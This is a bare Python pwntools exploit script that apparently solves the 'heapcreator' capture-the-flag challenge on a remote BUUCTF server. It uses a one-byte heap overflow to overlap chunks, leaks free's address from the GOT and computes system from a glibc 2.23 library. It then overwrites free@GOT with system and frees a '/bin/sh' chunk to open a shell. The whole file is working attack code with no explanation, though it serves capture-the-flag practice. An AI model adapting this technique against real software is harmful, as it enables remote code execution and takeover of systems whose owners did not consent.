from pwn import *

# p = process('./heapcreator')
p = remote('node4.buuoj.cn', 26828)
elf = ELF('./heapcreator')
lib = ELF('/home/hututu/tools/glibc-all-in-one/libs/2.23-0ubuntu11_amd64/libc-2.23.so')


def add(size_, mess):
    p.recvuntil(b'Your choice :')
    p.sendline(b'1')
    p.recvuntil(b'Size of Heap :')
    p.sendline(size_)
    p.recvuntil(b'Content of heap:')
    p.send(mess)


def edit(id_, mess):
    p.recvuntil(b'Your choice :')
    p.sendline(b'2')
    p.recvuntil(b'Index :')
    p.sendline(id_)
    p.recvuntil(b'Content of heap :')
    p.send(mess)


def show(id_):
    p.recvuntil(b'Your choice :')
    p.sendline(b'3')
    p.recvuntil(b'Index :')
    p.sendline(id_)


def delete(id_):
    p.recvuntil(b'Your choice :')
    p.sendline(b'4')
    p.recvuntil(b'Index :')
    p.sendline(id_)


free_got = elf.got['free']
add(b'24', b'aaaa')
add(b'16', b'bbbb')
payload = b'/bin/sh\00' + b'a' * 0x10 + b'\x41'
edit(b'0', payload)
delete(b'1')
payload = p64(0) * 4 + p64(0x30) + p64(free_got)
add(b'48', payload)
show(b'1')
free_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\00'))
print(hex(free_addr))
system_addr = free_addr - lib.symbols['free'] + lib.symbols['system']
payload = p64(system_addr)
edit(b'1', payload)
delete(b'0')
# gdb.attach(p)
p.interactive()
